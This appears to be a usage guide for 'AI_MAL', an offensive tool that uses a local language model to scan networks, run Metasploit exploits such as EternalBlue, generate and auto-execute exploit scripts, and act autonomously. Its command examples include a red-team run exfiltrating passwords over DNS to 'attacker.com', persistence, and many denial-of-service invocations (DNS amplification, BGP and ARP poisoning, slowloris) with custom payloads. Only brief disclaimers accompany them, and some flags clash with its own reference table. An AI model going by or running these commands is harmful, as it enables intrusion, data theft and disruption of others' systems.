# AI_MAL Use Cases

This document outlines various use cases and scenarios for the AI_MAL (Advanced Intelligent Machine-Aided Learning) tool.

## Table of Contents
1. [Basic Usage](#basic-usage)
2. [Advanced Scanning](#advanced-scanning)
3. [Metasploit Integration](#metasploit-integration)
4. [Custom Script Generation](#custom-script-generation)
5. [System Requirements](#system-requirements)
6. [Best Practices](#best-practices)
7. [Troubleshooting](#troubleshooting)
8. [Complex Argument Combinations](#complex-argument-combinations)
9. [Enhanced DoS Attack Methods](#enhanced-dos-attack-methods)

## Basic Usage

### Simple Network Discovery
```bash
# Basic network discovery
sudo AI_MAL 192.168.1.0/24

# Auto-discover network interfaces
sudo AI_MAL --auto-discover

# Stealth mode for minimal detection
sudo AI_MAL 192.168.1.1 --stealth
```

### Port Scanning
```bash
# Comprehensive port scan
sudo AI_MAL 192.168.1.1 --ports all

# Quick scan of common ports
sudo AI_MAL 192.168.1.1 --ports quick

# Custom port range
sudo AI_MAL 192.168.1.1 --ports 80,443,8080-8090
```

## Advanced Scanning

### Service Detection
```bash
# Detailed service detection
sudo AI_MAL 192.168.1.1 --services

# Version detection
sudo AI_MAL 192.168.1.1 --version

# OS detection
sudo AI_MAL 192.168.1.1 --os
```

### Vulnerability Assessment
```bash
# Basic vulnerability scan
sudo AI_MAL 192.168.1.1 --vuln

# Comprehensive vulnerability assessment
sudo AI_MAL 192.168.1.1 --vuln --exploit

# Custom vulnerability checks
sudo AI_MAL 192.168.1.1 --vuln --custom vuln_checks.txt
```

## Metasploit Integration

### Basic Metasploit Usage
```bash
# Enable Metasploit integration
sudo AI_MAL 192.168.1.1 --msf

# Run Metasploit exploits
sudo AI_MAL 192.168.1.1 --msf --exploit

# Custom Metasploit options
sudo AI_MAL 192.168.1.1 --msf --options "RHOSTS=192.168.1.1 RPORT=445"
```

### Advanced Metasploit Features
```bash
# Generate Metasploit payloads
sudo AI_MAL 192.168.1.1 --msf --payload windows/meterpreter/reverse_tcp

# Custom exploit modules
sudo AI_MAL 192.168.1.1 --msf --module exploit/windows/smb/ms17_010_eternalblue

# Post-exploitation
sudo AI_MAL 192.168.1.1 --msf --post
```

## Custom Script Generation

### Basic Script Generation
```bash
# Generate custom Nmap script
sudo AI_MAL --generate-script basic_scan.nse

# Generate Metasploit automation script
sudo AI_MAL --generate-script msf_automation.rb

# Generate custom vulnerability check
sudo AI_MAL --generate-script vuln_check.py
```

### Advanced Script Generation
```bash
# Generate custom service detection script
sudo AI_MAL --generate-script service_detect.nse --type service

# Generate custom exploit script
sudo AI_MAL --generate-script custom_exploit.rb --type exploit

# Generate post-exploitation script
sudo AI_MAL --generate-script post_exploit.py --type post
```

## System Requirements

### Model Selection
```bash
# Use default model (qwen2.5-coder:7b) - Recommended for systems with >8GB RAM
sudo AI_MAL 192.168.1.1 --model qwen2.5-coder:7b

# Use lightweight model (gemma3:1b) - Recommended for systems with <8GB RAM
sudo AI_MAL 192.168.1.1 --model gemma3:1b

# Use custom model (must be available in Ollama)
sudo AI_MAL 192.168.1.1 --model custom-model
```

### Resource Management
```bash
# Set custom timeout for model responses
sudo AI_MAL 192.168.1.1 --timeout 30

# Limit concurrent scans
sudo AI_MAL 192.168.1.1 --max-threads 4

# Set memory limits
sudo AI_MAL 192.168.1.1 --memory-limit 4G
```

## Best Practices

### Security Considerations
1. Always run with proper authorization
2. Use stealth mode when appropriate
3. Limit scan intensity on production networks
4. Follow responsible disclosure practices
5. Document all testing activities

### Performance Optimization
1. Choose appropriate model based on system resources
2. Use quick scans for initial reconnaissance
3. Limit concurrent operations
4. Monitor system resources
5. Use appropriate timeouts

### Network Considerations
1. Consider network bandwidth limitations
2. Use appropriate scan timing
3. Avoid scanning sensitive systems
4. Document network topology
5. Follow network security policies

## Troubleshooting

### Common Issues
1. Model loading failures
   - Check system memory
   - Verify Ollama installation
   - Try alternative model

2. Metasploit connection issues
   - Verify PostgreSQL service
   - Check msfrpcd service
   - Validate credentials

3. Network connectivity problems
   - Check firewall settings
   - Verify network permissions
   - Test basic connectivity

### Debug Mode
```bash
# Enable debug logging
sudo AI_MAL 192.168.1.1 --debug

# Verbose output
sudo AI_MAL 192.168.1.1 --verbose

# Save debug logs
sudo AI_MAL 192.168.1.1 --debug --log debug.log
```

### Recovery Procedures
1. Restart required services
   ```bash
   sudo systemctl restart ai_mal_deps.service
   ```

2. Verify model installation
   ```bash
   ollama list
   ollama pull qwen2.5-coder:7b  # or gemma3:1b
   ```

3. Check service status
   ```bash
   sudo systemctl status ai_mal_deps.service
   sudo systemctl status msfrpcd.service
   ```

## Command-Line Arguments Reference

The following table provides a comprehensive list of all available command-line arguments in AI_MAL:

| Argument | Description | Default | Example |
|----------|-------------|---------|---------|
| `--auto-discover` | Automatically discovers network interfaces and active hosts | None | `sudo AI_MAL --auto-discover` |
| `--interface INTERFACE` | Specifies network interface for scanning | None | `sudo AI_MAL --interface eth0` |
| `--network CIDR` | Specifies network range in CIDR notation | None | `sudo AI_MAL --network 192.168.1.0/24` |
| `--scan-all` | Scans all discovered hosts instead of just the first one | False | `sudo AI_MAL --scan-all` |
| `--host-timeout SECONDS` | Sets timeout for host discovery | 1 | `sudo AI_MAL --host-timeout 3` |
| `--iterations N` | Sets maximum number of scan iterations | 3 | `sudo AI_MAL --iterations 5` |
| `--continuous` | Runs scan in continuous mode until stopped | False | `sudo AI_MAL --continuous` |
| `--delay SECONDS` | Sets delay between scan iterations | 2 | `sudo AI_MAL --delay 5` |
| `--stealth` | Enables stealth mode to minimize detection | False | `sudo AI_MAL --stealth` |
| `--ports [all\|quick\|RANGE]` | Specifies ports to scan | quick | `sudo AI_MAL --ports 80,443,8080-8090` |
| `--services` | Enables detailed service detection | False | `sudo AI_MAL --services` |
| `--version` | Enables version detection | False | `sudo AI_MAL --version` |
| `--os` | Enables OS detection | False | `sudo AI_MAL --os` |
| `--vuln` | Enables vulnerability scanning | False | `sudo AI_MAL --vuln` |
| `--exploit` | Attempts exploitation of vulnerabilities | False | `sudo AI_MAL --exploit` |
| `--custom FILE` | Specifies custom vulnerability checks file | None | `sudo AI_MAL --custom vuln_checks.txt` |
| `--msf` | Enables Metasploit integration | False | `sudo AI_MAL --msf` |
| `--workspace NAME` | Sets Metasploit workspace name | adaptive_scan | `sudo AI_MAL --workspace client_pentest` |
| `--auto-script` | Generates and runs Metasploit resource scripts | False | `sudo AI_MAL --auto-script` |
| `--dos` | Attempts Denial of Service attacks | False | `sudo AI_MAL --dos` |
| `--custom-scripts` | Enables AI-powered script generation | False | `sudo AI_MAL --custom-scripts` |
| `--script-type TYPE` | Specifies script generation type | bash | `sudo AI_MAL --script-type python` |
| `--execute-scripts` | Automatically executes generated scripts | False | `sudo AI_MAL --execute-scripts` |
| `--model MODEL` | Specifies Ollama model to use | qwen2.5-coder:7b | `sudo AI_MAL --model gemma3:1b` |
| `--timeout SECONDS` | Sets timeout for model responses | 30 | `sudo AI_MAL --timeout 45` |
| `--max-threads N` | Limits concurrent scan operations | 4 | `sudo AI_MAL --max-threads 2` |
| `--memory-limit SIZE` | Sets memory limit for operations | None | `sudo AI_MAL --memory-limit 4G` |
| `--quiet` | Reduces verbosity of output | False | `sudo AI_MAL --quiet` |
| `--debug` | Enables detailed debug logging | False | `sudo AI_MAL --debug` |
| `--show-live-ai` | Shows AI's thought process in real-time | False | `sudo AI_MAL --show-live-ai` |
| `--full-auto` | Enables full autonomous mode | False | `sudo AI_MAL --full-auto` |
| `--help` | Shows help message and exits | None | `sudo AI_MAL --help` |
| `--version` | Shows version information and exits | None | `sudo AI_MAL --version` |

### Notes:
- All commands require root privileges (use `sudo`)
- Multiple arguments can be combined in a single command
- Some arguments may have dependencies on others (e.g., `--exploit` requires `--msf`)
- Memory-intensive operations may require adjusting `--memory-limit` and `--max-threads`
- The `--model` argument supports any model available in Ollama, but `qwen2.5-coder:7b` and `gemma3:1b` are recommended

## Additional Resources

## Complex Argument Combinations

### Advanced Red Team Operations
```bash
# Full red team engagement with persistence and data exfiltration
sudo AI_MAL 192.168.1.1 --red-team --persistence --exfil --exfil-method dns --exfil-data passwords --exfil-server attacker.com

# Stealth red team operations with custom exfiltration
sudo AI_MAL 192.168.1.1 --red-team --stealth --exfil --exfil-method icmp --exfil-data configs --exfil-server 10.0.0.1

# Full red team with Metasploit integration and persistence
sudo AI_MAL 192.168.1.1 --red-team --msf --exploit --persistence --exfil --exfil-method smb --exfil-data all
```

### Advanced DoS Operations
```bash
# Multi-method DoS attack with custom payload
sudo AI_MAL 192.168.1.1 --dos --dos-method slowloris --dos-threads 50 --dos-duration 300 --dos-payload "GET / HTTP/1.1\r\nHost: 192.168.1.1\r\n"

# Resource exhaustion attack
sudo AI_MAL 192.168.1.1 --dos --dos-method resource --dos-threads 100 --dos-duration 600

# Protocol-specific DoS
sudo AI_MAL 192.168.1.1 --dos --dos-method protocol --dos-threads 75 --dos-duration 180
```

### Advanced Network Discovery and Scanning
```bash
# Comprehensive network discovery with custom scripts
sudo AI_MAL --auto-discover --custom-scripts --script-type python --execute-scripts --show-live-ai

# Stealth network mapping with service detection
sudo AI_MAL 192.168.1.0/24 --stealth --services --version --os --quiet

# Continuous monitoring with vulnerability assessment
sudo AI_MAL 192.168.1.1 --continuous --delay 5 --vuln --exploit --msf --workspace monitoring
```

## Enhanced DoS Attack Methods

### Resource Exhaustion Attacks
```bash
# CPU exhaustion attack
sudo AI_MAL 192.168.1.1 --dos --dos-method cpu --dos-threads 100 --dos-duration 300

# Memory exhaustion attack
sudo AI_MAL 192.168.1.1 --dos --dos-method memory --dos-threads 50 --dos-duration 600

# Disk space exhaustion
sudo AI_MAL 192.168.1.1 --dos --dos-method disk --dos-threads 25 --dos-duration 900
```

### Protocol-Specific Attacks
```bash
# HTTP/2 DoS (Multiple Stream Attack)
sudo AI_MAL 192.168.1.1 --dos --dos-method http2 --dos-threads 75 --dos-duration 180

# DNS Amplification
sudo AI_MAL 192.168.1.1 --dos --dos-method dns --dos-threads 100 --dos-duration 300

# TCP Connection Exhaustion
sudo AI_MAL 192.168.1.1 --dos --dos-method tcp --dos-threads 200 --dos-duration 120
```

### Application-Specific Attacks
```bash
# Web Server DoS (Slow POST)
sudo AI_MAL 192.168.1.1 --dos --dos-method slowpost --dos-threads 50 --dos-duration 240

# Database Connection Pool Exhaustion
sudo AI_MAL 192.168.1.1 --dos --dos-method dbpool --dos-threads 100 --dos-duration 300

# Cache Poisoning Attack
sudo AI_MAL 192.168.1.1 --dos --dos-method cache --dos-threads 75 --dos-duration 180
```

### Network Infrastructure Attacks
```bash
# BGP Route Poisoning
sudo AI_MAL 192.168.1.1 --dos --dos-method bgp --dos-threads 25 --dos-duration 600

# ARP Cache Poisoning
sudo AI_MAL 192.168.1.1 --dos --dos-method arp --dos-threads 50 --dos-duration 300

# VLAN Hopping Attack
sudo AI_MAL 192.168.1.1 --dos --dos-method vlan --dos-threads 75 --dos-duration 240
```

### Advanced Attack Combinations
```bash
# Multi-vector attack with resource exhaustion
sudo AI_MAL 192.168.1.1 --dos --dos-method "cpu,memory,disk" --dos-threads 100 --dos-duration 300

# Protocol stack attack
sudo AI_MAL 192.168.1.1 --dos --dos-method "tcp,http2,dns" --dos-threads 150 --dos-duration 180

# Infrastructure and application attack
sudo AI_MAL 192.168.1.1 --dos --dos-method "bgp,dbpool,cache" --dos-threads 75 --dos-duration 240
```

### Custom Attack Payloads
```bash
# Custom HTTP payload for web server DoS
sudo AI_MAL 192.168.1.1 --dos --dos-method http --dos-payload "POST /api/v1/data HTTP/1.1\r\nContent-Length: 1000000\r\n\r\n"

# Custom TCP payload for connection exhaustion
sudo AI_MAL 192.168.1.1 --dos --dos-method tcp --dos-payload "SYN|ACK|RST|FIN"

# Custom DNS query for amplification
sudo AI_MAL 192.168.1.1 --dos --dos-method dns --dos-payload "ANY query for large domain"
```

Note: All DoS attacks should be used responsibly and only on systems you have permission to test. Unauthorized DoS attacks may be illegal in many jurisdictions.
   